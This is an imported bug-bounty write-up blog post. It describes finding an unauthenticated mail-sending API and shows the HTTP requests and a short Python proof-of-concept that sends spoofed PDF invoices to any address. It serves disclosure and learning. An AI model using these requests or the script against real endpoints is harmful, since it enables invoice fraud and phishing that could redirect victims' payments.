---
source: imported
source_type: markdown
original_path: knowledge-inbox/blogs-incoming/2020-08-19_a-perfect-duplicate-or-how-to-send-an-email-with-a-spoofed-invoices-content.md
original_filename: 2020-08-19_a-perfect-duplicate-or-how-to-send-an-email-with-a-spoofed-invoices-content.md
title: A perfect duplicate or how to send an email with a spoofed invoice’s content
category: documents
detected_topics:
- command-injection
- automation-abuse
- api-security
tags:
- imported
- documents
- command-injection
- automation-abuse
- api-security
language: en
raw_sha256: ee225d76f9b83669fe89c9b081afdaee702026b0f866d71d452d0c154933e76a
text_sha256: 383e9331978d5cfe3f857685ab4dc3ee262e1249195350288a0c0e32730d2de4
ingested_at: '2026-06-28T07:32:03Z'
sensitivity: unknown
redactions_applied: false
---

# A perfect duplicate or how to send an email with a spoofed invoice’s content

## Source Metadata

- Original Path: knowledge-inbox/blogs-incoming/2020-08-19_a-perfect-duplicate-or-how-to-send-an-email-with-a-spoofed-invoices-content.md
- Source Type: markdown
- Detected Topics: command-injection, automation-abuse, api-security
- Ingested At: 2026-06-28T07:32:03Z
- Redactions Applied: False
- Raw SHA256: `ee225d76f9b83669fe89c9b081afdaee702026b0f866d71d452d0c154933e76a`
- Text SHA256: `383e9331978d5cfe3f857685ab4dc3ee262e1249195350288a0c0e32730d2de4`


## Content

---
title: "A perfect duplicate or how to send an email with a spoofed invoice’s content"
url: "https://medium.com/@mateusz.olejarka/a-perfect-duplicate-or-how-to-send-an-email-with-a-spoofed-invoices-content-66cf369bbaa3"
authors: ["Mateusz Olejarka (@molejarka)"]
bugs: ["Email spoofing", "Open mail relay", "Missing authentication"]
publication_date: "2020-08-19"
added_date: "2022-09-15"
source: "pentester.land/writeups.json"
original_index: 4304
scraped_via: "browseros"
---

# A perfect duplicate or how to send an email with a spoofed invoice’s content

A perfect duplicate or how to send an email with a spoofed invoice’s content
Mateusz Olejarka
Follow
2 min read
·
Aug 19, 2020

101

2

T
his is a story about one of my most interesting findings without a happy ending. Spoiler alert — the bug was closed as duplicace. Duplicate is still a valid bug and in this case it’s yet another reason to improve my automation. Moreover I also learned a bit finding it.

It was interesting from the beginning. First I routinely ran a dictionary against a host, which resulted in one interesting thing. I ommited the boring parts of HTTP requests and responses to keep this short.

GET /sendmail HTTP/1.1
Host: host:exoticport
HTTP/1.1 405 Method Not Allowed
content-length: 0

So POST it is:

POST /sendmail HTTP/1.1
Host: host:exoticport
Content-Type: application/json
Content-Length: 0
HTTP/1.1 422 Unprocessable Entity
[CUT] type missing [CUT]

So I add type:

POST /sendmail HTTP/1.1
Host: host:exoticport
Content-Type: application/json
Content-Length: 12
{“type”:0}
HTTP/1.1 422 Unprocessable Entity
[CUT] expected=string, got=number, field=type [CUT]

So type was a string. Here I spent some time enumerating and guessing/googling what exactly type value can be in case of an API, which apparently sends emails.
Then I found out. I also assumed that there should be a to field:

POST /sendmail HTTP/1.1
Host: host:exoticport
Content-Type: application/json
Content-Length: 25
{“type”:”pdf”, “to”:””}
HTTP/1.1 500 Internal Server Error
[CUT] invalid address [CUT] 

It made perfect sense, so next step I set proper to value:

POST /sendmail HTTP/1.1
Host: host:exoticport
Content-Type: application/json
Content-Length: 53
{“type”:”pdf”, “to”:”[valid-email]”}
HTTP/1.1 200 OK
[CUT] mail Sent [CUT]

Nice. Then I opened my inbox and almost jumped.

Get Mateusz Olejarka’s stories in your inbox

Join Medium for free to get updates from this writer.

Subscribe

Remember me for faster sign in

I got an email with a pdf attachment named invoice. It was empty. Awesome. If only I could set a subject and spoof attachment’s content.
First one was easy: subject was subject. Second one required a bit guesswork again and the parameter containing pdf content was named body. The content needed to be Base64 encoded.

So, for final PoC I wrote short script:

import base64, requests
def uploadfile(filename):
 resp = requests.post(“http://host:exoticport/sendmail", data = {“type”:”pdf”, “to”:”[valid-email]”, “subject”: “invoice_spoof”, “body” : base64.b64encode(open(filename, “rb”).read())})
 
uploadfile(‘test.pdf’)

The results looked like this:

Email message with invoice
Spoofed invoice content

N
ow I could spoof the invoice with my bank account ad possibly redirect payments to me. A perfect P1 bug. I learned few years ago not to get excited, but still I hoped to get a nice bounty. It was closed as a duplicate instead. The end.
